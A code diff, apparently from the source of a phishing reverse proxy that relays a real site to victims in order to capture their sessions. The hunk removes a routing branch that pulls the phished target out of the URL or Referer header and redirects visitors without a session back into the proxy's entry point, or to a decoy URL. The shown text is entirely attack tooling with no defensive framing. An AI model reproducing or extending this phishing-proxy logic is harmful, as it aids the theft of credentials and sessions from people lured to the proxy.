@@ -155,41 +155,6 @@ if (url.startsWith('/login') && url.includes(PHISHED_URL_PARAMETER)) {
         }
 }
 
-    else if (!currentSession && 
-         url !== PROXY_ENTRY_POINT && 
-         url !== PROXY_PATHNAMES.serviceWorker && 
-         url !== PROXY_PATHNAMES.favicon && 
-         url !== PROXY_PATHNAMES.script && 
-         url !== PROXY_PATHNAMES.jsCookie && 
-         url !== PROXY_PATHNAMES.mutation) {
-    // No session and not a known path – try to extract target from current URL
-    let target = '';
-    try {
-        const query = url.split('?')[1] || '';
-        const params = new URLSearchParams(query);
-        target = params.get(PHISHED_URL_PARAMETER) || '';
-    } catch (e) {}
-    if (!target) {
-        try {
-            const referer = headers.referer || '';
-            if (referer) {
-                const refUrl = new URL(referer);
-                target = refUrl.searchParams.get(PHISHED_URL_PARAMETER) || '';
-            }
-        } catch (e) {}
-    }
-    if (target) {
-        const entryWithTarget = `${PROXY_ENTRY_POINT}&${PHISHED_URL_PARAMETER}=${encodeURIComponent(target)}`;
-        clientResponse.writeHead(302, { Location: entryWithTarget });
-        clientResponse.end();
-        return;
-    } else {
-        clientResponse.writeHead(302, { Location: REDIRECT_URL });
-        clientResponse.end();
-        return;
-    }
-    }
-
     else if (currentSession || url === PROXY_PATHNAMES.proxy) {
         if (url === PROXY_PATHNAMES.serviceWorker) {
             clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
